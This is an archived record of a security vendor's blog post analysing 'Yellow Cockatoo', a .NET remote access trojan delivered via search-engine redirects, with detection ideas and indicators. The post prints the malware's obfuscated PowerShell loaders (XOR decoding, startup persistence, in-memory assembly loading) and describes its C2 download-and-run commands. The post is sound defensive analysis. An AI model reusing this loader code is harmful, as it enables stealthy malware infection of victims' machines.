{
    "id": "0d2dc367-ebcd-49d2-ba48-8a58d1ac2eca",
    "created_at": "2023-01-12T15:08:26.543211Z",
    "updated_at": "2025-03-27T02:06:09.376611Z",
    "deleted_at": null,
    "sha1_hash": "776c2576712c6d01da118ac26e8cc5c1fd3e348a",
    "title": "2020-12-04 - Yellow Cockatoo- Search engine redirects, in-memory remote access trojan, and more",
    "authors": "",
    "file_creation_date": "2022-05-27T22:13:30Z",
    "file_modification_date": "2022-05-27T22:13:30Z",
    "file_size": 400329,
    "plain_text": "# See what it's like to have a partner in the fight.\n\n**redcanary.com/blog/yellow-cockatoo/**\n\nYellow Cockatoo is our name for a cluster of activity involving the execution of a .NET\nremote access trojan (RAT) that runs in memory and drops other payloads. We’ve been\ntracking this threat since June 2020. Yellow Cockatoo has targeted a range of victims\nacross multiple industries and company sizes, and we continue to see it, as recently as this\nweek.\n\n## Overlaps with other research\n\nOther than a [tweet from June referencing a related PowerShell script, Yellow Cockatoo](https://twitter.com/James_inthe_box/status/1276217146150752257)\nmostly evaded public notice until November 2020, when researchers from Morphisec\n[published a detailed overview of a threat they call Jupyter Infostealer. Jupyter Infostealer](https://www.morphisec.com/hubfs/eBooks_and_Whitepapers/Jupyter%20Infostealer%20WEB.pdf)\noverlaps significantly with the threat we call Yellow Cockatoo, and we’ll explain just exactly\n[how later in this post. Special thanks to Michael Gorelik and](https://twitter.com/smgoreli?lang=en) [Arnold Osipov of Morphisec for](https://twitter.com/osipov_ar)\ntaking the time compare notes on our respective research.\n\n### You may be wondering why we gave this activity a different name\n\nWe dubbed the threat we’ve been tracking “Yellow Cockatoo” several months ago.\nMorphisec has done excellent analysis of Jupyter Infostealer, but because we define Yellow\nCockatoo based on our visibility, we want to make it clear that we track this activity slightly\ndifferently than Morphisec does. Additionally, as we see more Yellow Cockatoo activity, we\n\n\n-----\n\nmay choose to define this cluster differently, and we don t want to inherit other teams\nanalyses by adopting their names. We’ve included a detailed overview of how our research\noverlaps with—and deviates from—Morphisec’s research at the end of this article.\n\n## Detecting Yellow Cockatoo\n\nWhile we haven’t developed any bespoke detection analytics that are designed to\nspecifically detect Yellow Cockatoo, we have a handful of detectors that have done a good\njob of alerting our detection engineering team of potentially related behaviors, including\nthose that turned us onto Yellow Cockatoo in the first place.\n\nSecurity teams have a number of distinct detection opportunities to catch Yellow Cockatoo.\nWhat follows is a rough chronology of what is likely to occur during an infection, organized\nby [ATT&CK tactics and detection opportunities, as well as descriptions of the behavioral](https://redcanary.com/mitre-attack/)\nanalytics that help us uncover Yellow Cockatoo activity.\n\n\n-----\n\nWhether you think you re dealing with a Yellow Cockatoo infection or not, the following\ndetection ideas should provide decent coverage against a variety of additional threats as\nwell.\n\n### Initial access\n\nYellow Cockatoo appears to gain initial access by redirecting search engine queries to a\nwebsite that attempts to upload a malicious executable onto victim machines. The\nexecutable feigns legitimacy by using the Microsoft Word icon. Its name is dependent on\nthe victim’s search query. For example, if the victim searched for “search-query” then the\nexecutable would be named `search-query.exe .`\n\n### Execution\n\nFollowing installation, the executable spawns a command line and creates a similarly\nnamed .tmp file that launches PowerShell. All of this is effectively precursor activity that\nleads to the execution of a malicious dynamic link library (DLL) that is a remote access\ntrojan (RAT) implemented as a .NET assembly designed to be loaded in memory.\n\nBelow are the redacted contents of the PowerShell script for your convenience:\n```\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -command\n\"$p='C:\\Users\\REDACTED\\e091d09fa72e9b46db8a0a512eec30c9.txt';$xk='KjycAqXpZMgQmwrRYFk\n[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($p));remove-item\n$p;for($i=0;$i -lt $xb.count;){for($j=0;$j -lt $xk.length;$j++){$xb[$i]=$xb[$i] bxor $xk[$j];$i++;if($i -ge $xb.count){$j=$xk.length}}};$xb=\n[System.Text.Encoding]::UTF8.GetString($xb);iex $xb;\"\n\n```\nWithin the above script, we have our first and second strong detection opportunities.\n\n**Detection opportunity #1: Base64 obfuscation in command line**\n\n\n-----\n\n[Encoded PowerShell isn t inherently malicious or suspicious, but it s less common for a well](https://docs.microsoft.com/en-us/dotnet/api/system.convert.frombase64string?view=net-5.0)\nmeaning administrator to encode PowerShell. It’s even less common for a legitimate\nPowerShell script to be stored in Base64 form and read on runtime, as seen here. As such,\nlooking for the execution of PowerShell along with a corresponding command line\ncontaining the term `base64 is a good way to catch Yellow Cockatoo and a wide variety of`\nother threats. That said, without the ability to effectively tune your detection logic, detecting\nthis behavior alone might generate high volumes of false positives.\n\n**Detection opportunity #2: XOR obfuscation in command line**\n\nPowerShell commands including the logical XOR operator are often malicious, so it makes\nsense to look for processes that appear to be PowerShell executing in conjunction with a\ncommand line containing the `-bxor operator. We commonly see XOR operations used to`\ngreat effect for obfuscation of threats such as Cobalt Strike beacons.\n\n### Persistence\n\nWhile that PowerShell command contains our first two detection opportunities within it, it\nalso creates a number of .lnk and .dat files that serve the purpose of loading the commandline script to execute the malicious DLL referenced earlier and analyzed in depth in the\n“Technical Analysis” section below.\n\n**Detection opportunity 3: PowerShell writing startup shortcuts**\n\nWe frequently observe adversaries using PowerShell to write malicious .lnk files into the\nstartup directory. In the context of Yellow Cockatoo, this persistence mechanism eventually\nlaunches the command-line script that leads to the installation of the malicious DLL. In this\nway, it pays to alert on processes that appear to be PowerShell creating .lnk files within\n```\nappdata or startup file paths or executing in conjunction with command lines\n\n```\ncontaining `appdata . In more PowerShell code below, Yellow Cockatoo creates and`\nconfigures the .lnk files. When detecting and investigating, you can treat startup .lnk files\ncontaining PowerShell, `cmd.exe, or` `mshta.exe commands as suspicious.`\n\n### Execution (again)\n\n\n-----\n\nThe .lnk and .dat files above (and sometimes an additional .cmd file) eventually launch\n```\ncmd.exe, which launches another suspicious block of PowerShell (included below),\n\n```\noffering us some added opportunities to detect Yellow Cockatoo.\n\nThis PowerShell activity alone contains a bunch of detection opportunities, including two of\nthe activities we suggested looking out for earlier:\n\nBase64 obfuscation in command line\nXOR obfuscation in command line\n\nHowever, we’ve got two additional detectors that alert on the elements of this PowerShell\nscript, which you can examine in the code block below:\n```\npowershell -w hidden -command\n\"$abab188938847d9e028b83169bd97=$env:appdata+'\\microsoft\\windows\\start\nmenu\\programs\\startup\\[REDACTED].lnk';if(-not(test-path\n$abab188938847d9e028b83169bd97)){$a1fe836cd2f4a584c8b26df3c899e=new-object comobject\nwscript.shell;$a887c3fc4114a6ae35adcfe97686a=$a1fe836cd2f4a584c8b26df3c899e.createsho\n[REDACTED]\\appdata\\roaming\\microsoft\\dwau\\\n[REDACTED].cmd';$a887c3fc4114a6ae35adcfe97686a.save();};if((get-process -name\n'*powershell*').count -lt 15)\n{$a41841141c743b8d10df14c793537='XjFIS3leTXtiQ15QYVBvXlBZLT5AVDh9Zl5TcCRWXm9OTG9eUWdZ\n[system.io.file]::readallbytes([system.text.encoding]::utf8.getstring([system.convert\n -lt $afc49a7db894a1989bc60a8b4dcd7.count;)\n{for($ad3c9c588084759dffa6395ab35e5=0;$ad3c9c588084759dffa6395ab35e5 -lt\n$a41841141c743b8d10df14c793537.length;$ad3c9c588084759dffa6395ab35e5++)\n{$afc49a7db894a1989bc60a8b4dcd7[$a0bf2735f83489b6c01ebc52dd3ad]=$afc49a7db894a1989bc6\n -bxor\n$a41841141c743b8d10df14c793537[$ad3c9c588084759dffa6395ab35e5];$a0bf2735f83489b6c01eb\n -ge $afc49a7db894a1989bc60a8b4dcd7.count)\n{$ad3c9c588084759dffa6395ab35e5=$a41841141c743b8d10df14c793537.length}}};\n[system.reflection.assembly]::load($afc49a7db894a1989bc60a8b4dcd7);[d.m]::run()}\"\n\n```\n**Detection opportunity #4: PowerShell writing startup shortcuts**\n\n\n-----\n\nPowerShell is using `System.Reflection.Assembly to` [load a .NET executable in](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=net-5.0#System_Reflection_Assembly_Load_System_Byte___)\nmemory. Adversaries frequently use this technique to introduce a malicious executable into\nan environment without it residing on disk. In this case, Yellow Cockatoo saved its .NET\nexecutable on disk but in obfuscated form. The only deobfuscated copy of the executable\nwould exist in memory at runtime. Looking for the execution of PowerShell along with a\ncorresponding command line containing `System.Reflection has allowed us to catch`\nmany threats leveraging this technique.\n\n### Parallel activity\n\nThat last bit of PowerShell referenced above ultimately loads the DLL containing the inmemory .NET RAT that we’re going to spend the better part of the rest of this blog post\ndiscussing. In turn, we’ve observed Yellow Cockatoo delivering other payloads in parallel\nwith the RAT, although we haven’t fully analyzed these executables.\n\nHowever, a cursory analysis of one of these binaries (the middle bullet) revealed that it\nreaches out to C2 domains that we have previously associated with malicious behavior, one\nof which is referenced multiple times in the “Technical analysis” section below. These\nexecutables have varied over time, and have included (but probably aren’t limited to) the\nfollowing:\n\nJune and October 2020: `docx2rtf.exe / docx2rtf-setup-v1.0-x64.exe (MD5:`\n```\n   ba95ebd0d6f6e7861b75149561f1fbd3 )\n\n```\nSeptember 2020: `photodesigner7_x86-64.exe (MD5:`\n```\n   63c9ace2fb8d1cb7eccf4e861d0e4e45 )\n\n```\nNovember 2020: `Expert_PDF.exe (MD5:` `156c5402667e5aae6971faea8e87bc62 )`\n\n## Deep dive on the .NET RAT\n\nThis section details our analysis of a version of a RAT that constitutes just one component\nof the overall cluster of activity we call Yellow Cockatoo.\n\n**We analyzed the following Yellow Cockatoo sample:**\n\nFilename: `111bc461-1ca8-43c6-97ed-911e0e69fdf8.dll`\nSHA256 hash:\n```\n   30E527E45F50D2BA82865C5679A6FA998EE0A1755361AB01673950810D071C85\n\n```\nMD5 hash: `4EB6170524B5E18D95BB56B937E89B36`\n\n**The above DLL conceals a .NET RAT that loads in memory. From a high level, it can:**\n\n1. Connect to, and communicate with, a command and control (C2) domain\n2. Download a second-stage payload\n3. Execute the payload in a loop (i.e., repeats steps 1 and 2 in an infinite loop)\n\n\n-----\n\n**On a more granular level, Yellow Cockatoo performs the following C2-related actions:**\n\n1. It collects a variety of host information (some of it listed below).\n2. It loads a randomly-generated string to\n```\n   %USERPROFILE%\\AppData\\Roaming\\solarmarker.dat, which serves as a unique\n\n```\nidentifier for the host.\n3. It connects to the C2 server (address: `https://gogohid[.]com/gate?`\n```\n   q=ENCODED_HOST_INFO ) sharing a variety of host information (see below) and\n\n```\nretrieving its first command.\n4. It retrieves and parses commands in an infinite loop.\n5. Upon executing a command, its execution status is reported to\n```\n   https://gogohid[.]com/success?i=ENCODED_CMD_AND_HOST_ID_INFO along with\n\n```\na certain information (see below).\n\nAs you can see in points 3 and 5 above, the C2 URLs contain byte-encoded JSON strings\n(we’ve replaced the actual strings with `=ENCODED_HOST_INFO and`\n```\nENCODED_CMD_AND_HOST_ID_INFO respectively).\n\n```\n**During the initial check-in with its C2, Yellow Cockatoo is capable of relaying the**\n**following:**\n```\n   hwid : the randomly generated value stored in\n   %USERPROFILE%\\AppData\\Roaming\\solarmarker.dat\n   pn : computer name\n   os : Windows OS version\n   x : host machine architecture (x64 or x86) based on the running process\n   prm : the permission level of the the running process (admin or user)\n   ver : malware version. Fixed string: DN-DN/FB1\n   wg : computer workgroup\n\n```\nThe C2 responds to the initial check-in with a unique command identifier ( id ). Any time\nYellow Cockatoo executes a command, it uses a similarly encoded URL string (see step 5\nabove) to send the `hwid and` `id back to the C2 server, effectively communicating to the`\nC2 server that the command has executed successfully.\n\n**The RAT implements the following commands:**\n```\n   rpe : downloads an executable buffer in memory and injects and loads it into\n   c:\\windows\\system32\\msinfo32.exe using Process Hollowing (T1055.012)\n\n```\ntechnique\n```\n   dnr : downloads an executable to %TEMP%\\24_CHAR_RANDOM_STRING.exe and\n\n```\nexecutes it\n\n\n-----\n\n```\npsp : downloads a PowerShell script to %TEMP%\\24_CHAR_RANDOM_STRING.ps1 and\n\n```\nexecutes it with `powershell.exe -ExecutionPolicy bypass`\n\n```\n\"%TEMP%\\24_CHAR_RANDOM_STRING.ps1\"\n\n```\n\nThe C2 can also issue an idle command that puts Yellow Cockatoo to sleep pending further\ncommands.\n\n## Conclusion\n\nWe hope this information and these detection opportunities serve useful to anyone trying to\nimprove detection coverage across this threat. While we’re not altogether sure how\nwidespread Yellow Cockatoo is, it’s ranked among the most common threats we’ve\ndetected for many months now. As always, if you have any feedback or questions, don’t\n[hesitate to send us an email.](http://10.10.0.46/mailto:blog@redcanary.com)\n\n## Appendix\n\n**Similarities and differences with Jupyter Infostealer**\n\nWhile this list may not be representative of all of the ways that our research overlaps, we\nhave identified the following similarities between what we define as Yellow Cockatoo and\n[what Morphisec defines as Jupyter Infostealer:](https://www.morphisec.com/hubfs/eBooks_and_Whitepapers/Jupyter%20Infostealer%20WEB.pdf)\n\n.exe naming pattern\nString `%USERPROFILE%\\AppData\\Roaming\\solarmarker.dat`\nDomain gogohid[.]com\nIP address subnet of 45.146.165[.]X\n\nHere are the aspects of Yellow Cockatoo that we believe may be distinct from Morphisec’s\nanalysis of Jupyter:\n\nThe initial delivery of Yellow Cockatoo malware through search engine redirects\nAdditional IP address used for C2, `45.146.165[.]221, albeit from the same subnet`\nas observed by Morphisec ( 45.146.165[.]X )\nWe analyzed what Morphisec calls the “C2 Jupyter client” while the “infostealer”\npayload they analyzed is a browser cookie stealer that we did not examine. To that\npoint, we base this on differences in the version in the .NET assembly. Our technical\nanalysis above focuses on the variant described in the Morphisec report as `DN-`\n```\n   DN/FB1 .\n\n```\n\n-----\n\nOur analysis focuses primarily on endpoint telemetry, including how the PowerShell\nloader that launched the infostealer. The telemetry we focused on has a slightly\ndifferent call run method:\n\nOne variant analyzed by Morphisec used the call run method\n```\n   [jupyTER.jupyTER]::RuN()\n\n```\nThe variant we focused our analysis on used the call run method\n\n```\n[d.m]::run()\n\n```\n\nRelated Articles\n\nDetection and response\n\n### ChromeLoader: a pushy malvertiser\n\nDetection and response\n\n### Intelligence Insights: May 2022\n\nDetection and response\n\n### The Goot cause: Detecting Gootloader and its follow-on activity\n\nDetection and response\n\n### Marshmallows & Kerberoasting\n\n**Subscribe to our blog**\n\nOur website uses cookies to provide you with a better browsing experience. More\n[information can be found in our Privacy Policy.](https://redcanary.com/privacy-policy)\n\nX\n\n**Privacy Overview**\n\nThis website uses cookies to improve your experience while you navigate through the\nwebsite. Out of these cookies, the cookies that are categorized as necessary are stored on\nyour browser as they are essential for the working of basic functionalities of the website. We\nalso use third-party cookies that help us analyze and understand how you use this website.\n\n\n-----\n\nThese cookies will be stored in your browser only with your consent. You also have the\noption to opt-out of these cookies. But opting out of some of these cookies may have an\neffect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category\nonly includes cookies that ensures basic functionalities and security features of the website.\nThese cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used\nspecifically to collect user personal data via analytics, ads, other embedded contents are\ntermed as non-necessary cookies. It is mandatory to procure user consent prior to running\nthese cookies on your website.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-04 - Yellow Cockatoo- Search engine redirects, in-memory remote access trojan, and more.pdf"
    ],
    "report_names": [
        "2020-12-04 - Yellow Cockatoo- Search engine redirects, in-memory remote access trojan, and more.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536106,
    "ts_updated_at": 1743041169,
    "ts_creation_date": 1653689610,
    "ts_modification_date": 1653689610,
    "files": {
        "pdf": "https://archive.orkl.eu/776c2576712c6d01da118ac26e8cc5c1fd3e348a.pdf",
        "text": "https://archive.orkl.eu/776c2576712c6d01da118ac26e8cc5c1fd3e348a.txt",
        "img": "https://archive.orkl.eu/776c2576712c6d01da118ac26e8cc5c1fd3e348a.jpg"
    }
}